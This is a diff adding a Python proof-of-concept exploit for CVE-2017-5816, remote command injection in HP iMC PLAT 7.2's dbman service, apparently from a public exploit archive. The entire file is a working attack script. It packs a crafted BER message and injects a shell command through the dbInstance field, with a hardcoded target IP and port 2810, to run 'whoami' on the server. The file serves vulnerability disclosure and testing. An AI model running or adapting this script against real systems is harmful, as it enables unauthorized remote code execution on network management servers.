@@ -1,0 +1,56 @@
+#!/opt/local/bin/python2.7
+
+# Exploit Title: HP iMC Plat 7.2 dbman Opcode 10008 Command Injection RCE
+# Date: 11-29-2017
+# Exploit Author: Chris Lyne (@lynerc)
+# Vendor Homepage: www.hpe.com
+# Software Link: https://h10145.www1.hpe.com/Downloads/DownloadSoftware.aspx?SoftwareReleaseUId=16759&ProductNumber=JG747AAE&lang=en&cc=us&prodSeriesId=4176535&SaidNumber=
+# Version: iMC PLAT v7.2 (E0403) Standard
+# Tested on: Windows Server 2008 R2 Enterprise 64-bit
+# CVE : CVE-2017-5816
+# See Also: http://www.zerodayinitiative.com/advisories/ZDI-17-340/
+
+# note that this PoC will create a file 'C:\10008.txt'
+
+from pyasn1.type.univ import *
+from pyasn1.type.namedtype import *
+from pyasn1.codec.ber import encoder
+import struct
+import binascii
+import socket, sys
+
+ip = '192.168.1.74'
+port = 2810
+payload = "whoami > C:\\10008.txt"
+opcode = 10008
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((ip, port))
+
+class DbmanMsg(Sequence):
+    componentType = NamedTypes(
+        NamedType('dbIp', OctetString()),
+        NamedType('iDBType', Integer()),
+        NamedType('dbInstance', OctetString()),
+        NamedType('dbSaUserName', OctetString()),
+        NamedType('dbSaPassword', OctetString()),
+        NamedType('strOraDbIns', OctetString())
+    )
+
+msg = DbmanMsg()
+
+msg['dbIp'] = ip
+msg['iDBType'] = 4
+msg['dbInstance'] = "a\"& " + payload + " &"
+msg['dbSaUserName'] = "b"
+msg['dbSaPassword'] = "c"
+msg['strOraDbIns'] = "d"
+
+encodedMsg = encoder.encode(msg, defMode=True)
+msgLen = len(encodedMsg)
+values = (opcode, msgLen, encodedMsg)
+s = struct.Struct(">ii%ds" % msgLen)
+packed_data = s.pack(*values)
+
+sock.send(packed_data)
+sock.close()
